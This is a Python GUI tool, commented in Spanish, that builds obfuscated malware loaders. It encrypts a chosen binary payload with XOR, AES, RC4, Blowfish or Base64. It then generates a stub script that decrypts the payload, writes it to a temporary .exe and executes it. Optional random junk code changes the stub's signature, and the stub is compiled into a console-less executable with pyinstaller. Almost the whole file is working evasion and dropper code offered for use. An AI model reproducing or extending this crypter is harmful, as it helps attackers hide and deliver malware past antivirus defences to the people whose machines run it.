#!/usr/bin/python
#-*- coding: utf-8 -*-
#Autor: Luis Angel Ramirez Mendoza
#______________________________________________________________________________________________________________________

import tkinter as tk
from tkinter import filedialog, messagebox
from tkinter import ttk
import subprocess
import base64
from Crypto.Cipher import AES, ARC4, Blowfish
from Crypto.Util.Padding import pad, unpad
import hashlib
import random
import string
import os
import tempfile

def xor_encrypt(data, key):
    key = key.encode()
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

def aes_encrypt(data, key):
    key = hashlib.sha256(key.encode()).digest()
    cipher = AES.new(key, AES.MODE_ECB)
    padded_data = pad(data, 16)  # Asegura que los datos tengan un tamaño múltiplo de 16
    return cipher.encrypt(padded_data)

def rc4_encrypt(data, key):
    cipher = ARC4.new(key.encode())
    return cipher.encrypt(data)

def blowfish_encrypt(data, key):
    key = key[:56].ljust(56).encode()
    cipher = Blowfish.new(key, Blowfish.MODE_ECB)
    padded_data = pad(data, 8)  # Asegura que los datos tengan un tamaño múltiplo de 8
    return cipher.encrypt(padded_data)

def generar_codigo_basura():
    """Genera código basura como comentarios."""
    junk_code = "\n".join([f"# {''.join(random.choices(string.ascii_letters + string.digits, k=50))}" for _ in range(10)])
    return junk_code

def cargar_payload(payload_path):
    try:
        with open(payload_path, "rb") as f:
            return f.read()
    except Exception as e:
        messagebox.showerror("Error", f"Error al cargar el payload: {str(e)}")
        return None

class OfuscadorApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Ofuscador de Payloads en Python")
        self.root.geometry("600x500")
        self.root.config(bg="#f4f4f4")
        self.root.iconbitmap('logo.ico')  

        self.payload_path = tk.StringVar()
        self.method = tk.StringVar(value="Base64")
        self.junk_code = tk.BooleanVar()
        self.key = tk.StringVar(value="clave_secreta")

        frame = ttk.Frame(root, padding="15")
        frame.grid(row=0, column=0, sticky="nsew")

        ttk.Label(frame, text="Seleccionar Payload:", font=("Arial", 12, "bold")).grid(row=0, column=0, sticky="w", pady=5)
        ttk.Entry(frame, textvariable=self.payload_path, width=50).grid(row=0, column=1, pady=5)
        ttk.Button(frame, text="Buscar", command=self.seleccionar_payload).grid(row=0, column=2, padx=5)

        ttk.Label(frame, text="Método de Ofuscación:", font=("Arial", 12, "bold")).grid(row=1, column=0, sticky="w", pady=5)
        methods = ["Base64", "XOR", "AES", "RC4", "Blowfish"]
        row = 2
        for method in methods:
            ttk.Radiobutton(frame, text=method, variable=self.method, value=method).grid(row=row, column=0, sticky="w", padx=20)
            row += 1

        ttk.Label(frame, text="Clave de Cifrado:", font=("Arial", 12, "bold")).grid(row=row, column=0, sticky="w", pady=5)
        ttk.Entry(frame, textvariable=self.key, width=50).grid(row=row, column=1, pady=5)
        row += 1

        ttk.Checkbutton(frame, text="Insertar Código Basura", variable=self.junk_code).grid(row=row, column=0, sticky="w", pady=5)
        row += 1

        ttk.Button(frame, text="Ofuscar Payload", command=self.ofuscar_payload).grid(row=row, column=0, columnspan=3, pady=10)
        ttk.Button(frame, text="Convertir a .exe", command=self.convertir_exe).grid(row=row+1, column=0, columnspan=3, pady=10)

    def seleccionar_payload(self):
        file_path = filedialog.askopenfilename(filetypes=[("Archivos Binarios", "*.bin *.exe *.dll")])
        if file_path:
            self.payload_path.set(file_path)

    def ofuscar_payload(self):
        payload = self.payload_path.get()
        if not payload:
            messagebox.showerror("Error", "Por favor selecciona un payload.")
            return
        
        try:
            data = cargar_payload(payload)
            if data is None:
                return

            method = self.method.get()
            key = self.key.get()

            if method == "Base64":
                result = base64.b64encode(data)
            elif method == "XOR":
                result = xor_encrypt(data, key)
            elif method == "AES":
                result = aes_encrypt(data, key)
            elif method == "RC4":
                result = rc4_encrypt(data, key)
            elif method == "Blowfish":
                result = blowfish_encrypt(data, key)

            script_path = self.guardar_archivo(result, "ofuscado")
            messagebox.showinfo("Éxito", f"Payload ofuscado guardado en: {script_path}")
        except Exception as e:
            messagebox.showerror("Error", f"Error al ofuscar: {str(e)}")

    def convertir_exe(self):
        payload = self.payload_path.get()
        if not payload:
            messagebox.showerror("Error", "Por favor selecciona un payload.")
            return

        try:
            script_path = payload.replace(".bin", "_ofuscado.py").replace(".exe", "_ofuscado.py").replace(".dll", "_ofuscado.py")
            subprocess.run(["pyinstaller", "--onefile", "--noconsole", script_path], check=True)
            messagebox.showinfo("Éxito", "Ejecutable creado en la carpeta 'dist'")
        except subprocess.CalledProcessError as e:
            messagebox.showerror("Error", f"Error al convertir a .exe: {str(e)}")

    def guardar_archivo(self, contenido, extension):
        script_path = self.payload_path.get().replace(".bin", f"_{extension}.py").replace(".exe", f"_{extension}.py").replace(".dll", f"_{extension}.py")
        with open(script_path, "w", encoding="utf-8") as f:
            if self.junk_code.get():
                # Agregar código basura como comentarios
                f.write(f"""
{generar_codigo_basura()}
import base64
import os
import tempfile
from Crypto.Cipher import AES, ARC4, Blowfish
from Crypto.Util.Padding import unpad
import hashlib

# Datos ofuscados
ofuscado = {repr(base64.b64encode(contenido).decode())}

# Decodificar y ejecutar
def descifrar_y_ejecutar(data, method, key):
    data = base64.b64decode(data)
    if method == "Base64":
        return data
    elif method == "XOR":
        key = key.encode()
        return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
    elif method == "AES":
        key = hashlib.sha256(key.encode()).digest()
        cipher = AES.new(key, AES.MODE_ECB)
        return unpad(cipher.decrypt(data), 16)
    elif method == "RC4":
        cipher = ARC4.new(key.encode())
        return cipher.decrypt(data)
    elif method == "Blowfish":
        key = key[:56].ljust(56).encode()
        cipher = Blowfish.new(key, Blowfish.MODE_ECB)
        return unpad(cipher.decrypt(data), 8)

# Ejecutar el payload
payload = descifrar_y_ejecutar(ofuscado, "{self.method.get()}", "{self.key.get()}")
with tempfile.NamedTemporaryFile(delete=False, suffix=".exe") as tmp:
    tmp.write(payload)
    tmp_path = tmp.name

# Ejecutar el archivo temporal
os.system(tmp_path)
{generar_codigo_basura()}
""")
            else:
                # Sin código basura
                f.write(f"""
import base64
import os
import tempfile
from Crypto.Cipher import AES, ARC4, Blowfish
from Crypto.Util.Padding import unpad
import hashlib

# Datos ofuscados
ofuscado = {repr(base64.b64encode(contenido).decode())}

# Decodificar y ejecutar
def descifrar_y_ejecutar(data, method, key):
    data = base64.b64decode(data)
    if method == "Base64":
        return data
    elif method == "XOR":
        key = key.encode()
        return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
    elif method == "AES":
        key = hashlib.sha256(key.encode()).digest()
        cipher = AES.new(key, AES.MODE_ECB)
        return unpad(cipher.decrypt(data), 16)
    elif method == "RC4":
        cipher = ARC4.new(key.encode())
        return cipher.decrypt(data)
    elif method == "Blowfish":
        key = key[:56].ljust(56).encode()
        cipher = Blowfish.new(key, Blowfish.MODE_ECB)
        return unpad(cipher.decrypt(data), 8)

# Ejecutar el payload
payload = descifrar_y_ejecutar(ofuscado, "{self.method.get()}", "{self.key.get()}")
with tempfile.NamedTemporaryFile(delete=False, suffix=".exe") as tmp:
    tmp.write(payload)
    tmp_path = tmp.name

# Ejecutar el archivo temporal
os.system(tmp_path)
""")
        return script_path

if __name__ == "__main__":
    root = tk.Tk()
    app = OfuscadorApp(root)
    root.mainloop()